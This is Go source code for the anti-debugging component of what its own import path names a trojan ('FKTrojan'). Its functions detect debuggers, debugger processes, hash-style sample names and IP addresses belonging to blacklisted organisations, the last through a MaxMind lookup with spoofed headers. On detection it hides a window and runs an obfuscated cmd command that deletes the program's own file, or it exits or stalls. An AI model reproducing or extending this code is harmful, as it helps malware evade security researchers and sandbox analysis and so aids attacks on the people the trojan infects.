/*
Author: FreeKnight
安全保护 - 反调试程序
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"bytes"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
	"time"
)

//------------------------------------------------------------
// 是否中獎（是否被調試程序掛上了）
func isDetect() bool {
	if detectIsNameInHashMode() || detectIsInDebuggerPresent() || detectIsIPInDangerousCompany() || detectIsDebugProcessExist() {
		return true
	}
	return false
}

//------------------------------------------------------------
// 执行中奖后处理（被调试程序挂上了之后的处理）
func doSthAfterDetect() {
	if debugReaction == 0 {
		goodbye := exec.Command("cmd", "/Q", "/C", common.Deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0])
		goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		goodbye.Start()
		if isFKDebug {
			FKDebugLog("Some dangerous things is detected, this app should be exit.")
		} else {
			os.Exit(-1)
		}
	} else if debugReaction == 1 {
		if isFKDebug {
			FKDebugLog("Some dangerous things is detected, this app should be exit.")
		} else {
			os.Exit(-1)
		}
	} else if debugReaction == 2 {
		for {
			time.Sleep(250 * time.Millisecond)
		}
	} else if debugReaction == 3 {
		FKDebugLog("We are detected by a DEBUG tools..")
	}
}

//------------------------------------------------------------
// Step1: 檢查exe執行時，是否是hash名执行。若是，表示被調試程序掛上了
func detectIsNameInHashMode() bool {
	match, _ := regexp.MatchString("[a-f0-9]{32}", os.Args[0])
	if match {
		FKDebugLog("Our exe name is Hash : " + os.Args[0])
	}
	return match
}

//------------------------------------------------------------
// Step2: 調用系統函數，檢查是否是不是被調試程序掛上了
func detectIsInDebuggerPresent() bool {
	Flag, _, _ := procIsDebuggerPresent.Call()
	if Flag != 0 {
		FKDebugLog("IsDebuggerPresent() return true.")
		return true
	}
	return false
}

//------------------------------------------------------------
// Step3: 检查IP是否在危險組織黑名單中，就知道是否在被調試了
func detectIsIPInDangerousCompany() bool {
	var client = new(http.Client)
	q, _ := http.NewRequest("GET", maxMindURL, nil)
	q.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	q.Header.Set("Referer", common.Deobfuscate(`iuuqt;00xxx/nbynjoe/dpn0fo0mpdbuf.nz.jq.beesftt`))
	r, err := client.Do(q)
	if err != nil {
		return false
	}
	if r.StatusCode == 200 {
		defer r.Body.Close()
		buf, err := ioutil.ReadAll(r.Body)
		if err != nil {
			return false
		}
		var pro maxMind
		err = json.NewDecoder(strings.NewReader(string(bytes.TrimSpace(buf)))).Decode(&pro)
		if err != nil {
			return false
		}
		for i := 0; i < len(organizationBlacklist); i++ {
			if strings.Contains(strings.ToUpper(pro.Traits.Organization), strings.ToUpper(organizationBlacklist[i])) {
				FKDebugLog("Our IP is in black list organization : " + pro.Traits.Organization)
				return true
			}
		}
	}
	return false
}

//------------------------------------------------------------
// Step4: 检查DEBUG工具黑名单是否在进程列表中
func detectIsDebugProcessExist() bool {
	for i := 0; i < len(debugBlacklist); i++ {
		b, proc := checkIsProcessInWin32ProcessList(debugBlacklist[i])
		if  b{
			FKDebugLog("Debug process is running : " + proc)
			return true
		}
	}
	return false
}

//------------------------------------------------------------
